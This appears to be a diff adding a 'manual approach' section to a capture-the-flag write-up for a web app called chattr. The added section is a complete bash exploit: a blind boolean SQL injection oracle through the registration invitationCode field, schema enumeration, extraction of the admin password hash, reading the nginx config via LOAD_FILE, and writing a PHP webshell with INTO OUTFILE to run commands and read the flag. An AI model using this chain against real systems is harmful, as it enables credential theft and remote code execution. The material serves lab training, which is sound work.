@@ -183,6 +183,114 @@ Recovered flag:
 061b1aeb94dec6bf5d9c27032b3c1d8d
 ```
 
+## 8) Manual approach (no sqlmap extraction)
+
+Use this fully manual sequence, driven by boolean SQLi + redirect oracle.
+
+```bash
+BASE='https://154.57.164.68:30877/api/register.php'
+
+oracle() {
+  local cond="$1"
+  local u="u$(date +%s%N | cut -c1-13)$RANDOM"
+  local payload="aaaa-bbbb-1111') OR (${cond})-- -"
+  local redir
+  redir=$(curl -k -s -o /dev/null -w '%{redirect_url}' -X POST "$BASE" \
+    --data-urlencode "username=$u" \
+    --data-urlencode 'password=Abcd!234' \
+    --data-urlencode 'repeatPassword=Abcd!234' \
+    --data-urlencode "invitationCode=$payload")
+  [[ "$redir" == *"login.php?s=account+created+successfully!"* ]]
+}
+
+infer_len() {
+  local expr="$1" max="${2:-200}" n
+  for n in $(seq 1 "$max"); do
+    if oracle "LENGTH(${expr})=${n}"; then echo "$n"; return 0; fi
+  done
+  return 1
+}
+
+infer_char() {
+  local expr="$1" pos="$2" lo=32 hi=126 mid
+  while [ $lo -le $hi ]; do
+    mid=$(( (lo+hi)/2 ))
+    if oracle "ASCII(SUBSTRING(${expr},${pos},1))>${mid}"; then
+      lo=$((mid+1))
+    else
+      hi=$((mid-1))
+    fi
+  done
+  printf "\\$(printf '%03o' "$lo")"
+}
+
+infer_string() {
+  local expr="$1" maxlen="${2:-200}" len out="" i c
+  len=$(infer_len "$expr" "$maxlen") || return 1
+  for i in $(seq 1 "$len"); do
+    c=$(infer_char "$expr" "$i")
+    out+="$c"
+  done
+  echo "$out"
+}
+
+# Run these in order:
+
+# 0) Confirm SQLi oracle
+oracle "1=1" && echo TRUE
+oracle "1=2" && echo FALSE || echo FALSE
+
+# 1) Enumerate databases (discover chattr)
+db_count=$(infer_string "(SELECT COUNT(*) FROM information_schema.schemata)" 3)
+echo "db_count=$db_count"
+for i in $(seq 0 $((db_count-1))); do
+  name=$(infer_string "(SELECT schema_name FROM information_schema.schemata LIMIT ${i},1)" 64)
+  echo "db[$i]=$name"
+done
+
+# 2) Enumerate tables in chattr
+t_count=$(infer_string "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='chattr')" 3)
+echo "table_count=$t_count"
+for i in $(seq 0 $((t_count-1))); do
+  t=$(infer_string "(SELECT table_name FROM information_schema.tables WHERE table_schema='chattr' LIMIT ${i},1)" 64)
+  echo "table[$i]=$t"
+done
+
+# 3) Enumerate columns in Users
+c_count=$(infer_string "(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='chattr' AND table_name='Users')" 3)
+echo "col_count=$c_count"
+for i in $(seq 0 $((c_count-1))); do
+  c=$(infer_string "(SELECT column_name FROM information_schema.columns WHERE table_schema='chattr' AND table_name='Users' LIMIT ${i},1)" 64)
+  echo "col[$i]=$c"
+done
+
+# 4) Q1: Extract admin password hash
+admin_hash=$(infer_string "(SELECT Password FROM chattr.Users WHERE Username='admin' LIMIT 0,1)" 200)
+echo "admin_hash=$admin_hash"
+
+# 5) Q2: Extract web root path from nginx config via LOAD_FILE
+root_expr="(SELECT TRIM(SUBSTRING_INDEX(SUBSTRING_INDEX(LOAD_FILE('/etc/nginx/sites-enabled/default'),'root ',-1),';',1)))"
+web_root=$(infer_string "$root_expr" 128)
+echo "web_root=$web_root"
+
+# 6) Q3: RCE - write webshell with UNION INTO OUTFILE
+hex_shell="0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e"  # <?php system($_GET['cmd']); ?>
+u="r$RANDOM$RANDOM"
+payload="aaaa-bbbb-1111') UNION SELECT ${hex_shell} INTO OUTFILE '${web_root}/shell.php'-- -"
+
+curl -k -s -o /dev/null -X POST "$BASE" \
+  --data-urlencode "username=$u" \
+  --data-urlencode 'password=Abcd!234' \
+  --data-urlencode 'repeatPassword=Abcd!234' \
+  --data-urlencode "invitationCode=$payload"
+
+# 7) Verify RCE + read flag
+curl -k -s 'https://154.57.164.68:30877/shell.php?cmd=id'
+flag_file=$(curl -k -s "https://154.57.164.68:30877/shell.php?cmd=ls%20/%20|%20grep%20'^flag_'")
+echo "flag_file=$flag_file"
+curl -k -s "https://154.57.164.68:30877/shell.php?cmd=cat%20/${flag_file}"
+```
+
 ## Final outputs
 
 1. Admin hash: `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`
